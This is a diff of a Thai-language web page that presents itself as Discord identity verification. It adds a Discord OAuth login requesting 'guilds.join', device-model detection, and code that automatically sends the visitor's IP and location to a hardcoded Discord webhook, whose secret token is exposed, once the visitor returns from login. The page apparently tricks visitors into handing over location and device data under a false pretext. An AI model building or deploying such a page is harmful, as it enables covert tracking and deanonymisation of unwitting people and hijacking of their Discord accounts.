@@ -2,41 +2,150 @@
 <html lang="th">
 <head>
   <meta charset="UTF-8" />
-  <title>Skidibi To Welcome</title>
+  <title>ยืนยันตัวตนด้วย Discord</title>
   <style>
     body {
-      font-family: Arial, sans-serif;
-      margin: 2rem;
-      background: #f0f0f0;
-      color: #222;
+      font-family: "Sarabun", sans-serif;
+      background: linear-gradient(to right, #e0f7fa, #f0f4f8);
+      color: #333;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .container {
+      max-width: 500px;
+      background: #ffffff;
+      margin: 50px 20px;
+      padding: 30px 20px;
+      border-radius: 20px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
       text-align: center;
     }
+
+    h2 {
+      font-size: 2rem;
+      color: #00796b;
+      margin-bottom: 20px;
+    }
+
+    #slideshow {
+      margin: 30px auto;
+      max-width: 400px;
+      max-height: 400px;
+      border-radius: 15px;
+      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
+      object-fit: cover;
+      transition: opacity 0.5s ease-in-out;
+    }
+
     button {
-      font-size: 1.2rem;
-      padding: 0.7rem 1.5rem;
-      background-color: #5865F2;
-      color: white;
+      background-color: #009688;
+      color: #fff;
+      padding: 14px 28px;
+      font-size: 1.1rem;
       border: none;
-      border-radius: 6px;
+      border-radius: 10px;
       cursor: pointer;
       transition: background-color 0.3s ease;
+      margin-top: 15px;
+      box-shadow: 0 6px 12px rgba(0, 150, 136, 0.3);
     }
+
     button:hover {
-      background-color: #4752c4;
+      background-color: #00796b;
     }
+
+    #device-info,
     #status {
-      margin-top: 1rem;
-      font-weight: bold;
-      min-height: 1.5rem;
+      margin-top: 20px;
+      font-size: 1rem;
+    }
+
+    #status.success { color: #2e7d32; }
+    #status.error { color: #d32f2f; }
+    #status.loading { color: #1565c0; }
+
+    .fb-comments {
+      margin-top: 40px;
     }
   </style>
 </head>
 <body>
-  <h2>📍 ยืนยันตัวตน Discord</h2>
-  <button onclick="getLocation()">📤 กดยืนยันตัวตน</button>
-  <p id="status">ยังไม่มีการส่งข้อมูล</p>
+  <div class="container">
+    <h2>📍 ยืนยันตัวตน Discord</h2>
+
+    <img id="slideshow" src="https://i.pinimg.com/originals/8c/b2/88/8cb288daa036f41d26e5bf9118360ccd.jpg" alt="Slideshow Image" />
+
+    <button id="loginBtn">เข้าสู่ระบบด้วย Discord</button>
+
+    <button onclick="getLocation()">📤 กดยืนยันตัวตน</button>
+
+    <p id="device-info">📱 กำลังตรวจสอบรุ่นอุปกรณ์...</p>
+    <p id="status">ยังไม่มีการยืนยัน</p>
+
+    <div style="width: 100%; max-width: 500px; margin-bottom: 50px;">
+      <div id="fb-root"></div>
+      <script async defer crossorigin="anonymous"
+        src="https://connect.facebook.net/th_TH/sdk.js#xfbml=1&version=v17.0"></script>
+
+      <div class="fb-comments"
+        data-href="https://rewzakungz1.github.io/Web/"
+        data-width="100%"
+        data-numposts="5">
+      </div>
+    </div>
+  </div>
 
   <script>
+    // ==== สไลด์รูปภาพ ====
+    const images = [
+      "https://i.pinimg.com/originals/8c/b2/88/8cb288daa036f41d26e5bf9118360ccd.jpg",
+      "https://m.media-amazon.com/images/S/pv-target-images/14117e646cbbd335e492cae12eb39762f02e1a4c0bf98868009444aec2e62d30.jpg",
+      "https://m.media-amazon.com/images/S/pv-target-images/7d25a2bf9820ec7310037be0ea7258dcc0b9a1a1218a4622068b87b9e7f394ce.jpg"
+    ];
+    let currentIndex = 0;
+    const slideshowEl = document.getElementById("slideshow");
+    function changeImage() {
+      currentIndex = (currentIndex + 1) % images.length;
+      slideshowEl.style.opacity = 0;
+      setTimeout(() => {
+        slideshowEl.src = images[currentIndex];
+        slideshowEl.style.opacity = 1;
+      }, 500);
+    }
+    setInterval(changeImage, 3000);
+
+    // ==== ตรวจจับรุ่นอุปกรณ์ ====
+    function detectDeviceModel(userAgent) {
+      if (/iPhone/.test(userAgent)) return "iPhone";
+      if (/iPad/.test(userAgent)) return "iPad";
+      if (/Android/.test(userAgent)) {
+        const match = userAgent.match(/Android.*?;\s?([^;)]*)/);
+        return match ? match[1].trim() : "Android (ไม่ทราบรุ่น)";
+      }
+      if (/Windows/.test(userAgent)) return "Windows PC";
+      if (/Macintosh/.test(userAgent)) return "Mac";
+      return "ไม่สามารถระบุรุ่นอุปกรณ์ได้";
+    }
+
+    const deviceModel = detectDeviceModel(navigator.userAgent);
+    document.getElementById("device-info").innerText = "📱 รุ่นอุปกรณ์: " + deviceModel;
+
+    // ==== Discord OAuth ====
+    const CLIENT_ID = "1226784287907512342";  // ใส่ client id ของคุณ
+    const REDIRECT_URI = encodeURIComponent("https://host-4cnp.onrender.com/callback");  // ใส่ redirect URI ของคุณ
+    const SCOPE = "identify guilds.join";
+    const loginBtn = document.getElementById("loginBtn");
+    const statusEl = document.getElementById("status");
+
+    loginBtn.addEventListener("click", () => {
+      const discordAuthUrl = `https://discord.com/api/oauth2/authorize?client_id=${CLIENT_ID}&redirect_uri=${REDIRECT_URI}&response_type=code&scope=${SCOPE}`;
+      window.location.href = discordAuthUrl;
+    });
+
     const webhookUrl = "https://discord.com/api/webhooks/1380863471041777724/EONsTADIyl9QbykL2d3oq7_YyQO_BDvgucT0j2yiZkkjHypony6HReLk8MXAphuiUdCr";
 
     function getLocation() {
@@ -103,23 +212,15 @@
         statusEl.innerText = "❌ เกิดข้อผิดพลาด: " + err.message;
       });
     }
+    
+    // ตรวจว่ากลับมาจาก Discord (มี code อยู่) → ส่งข้อมูลเลย
+    function getQueryParam(param) {
+      return new URLSearchParams(window.location.search).get(param);
+    }
 
-    function showError(error) {
-      const statusEl = document.getElementById("status");
-      switch(error.code) {
-        case error.PERMISSION_DENIED:
-          statusEl.innerText = "❌ ผู้ใช้ปฏิเสธการขออนุญาตตำแหน่ง";
-          break;
-        case error.POSITION_UNAVAILABLE:
-          statusEl.innerText = "❌ ไม่สามารถระบุตำแหน่งได้ (ข้อมูลตำแหน่งไม่พร้อม)";
-          break;
-        case error.TIMEOUT:
-          statusEl.innerText = "❌ หมดเวลาการรอการระบุตำแหน่ง";
-          break;
-        default:
-          statusEl.innerText = "❌ เกิดข้อผิดพลาดในการระบุตำแหน่ง: " + error.message;
-          break;
-      }
+    if (getQueryParam("code")) {
+      loginBtn.style.display = "none";
+      sendIpLocationToWebhook();
     }
   </script>
 </body>
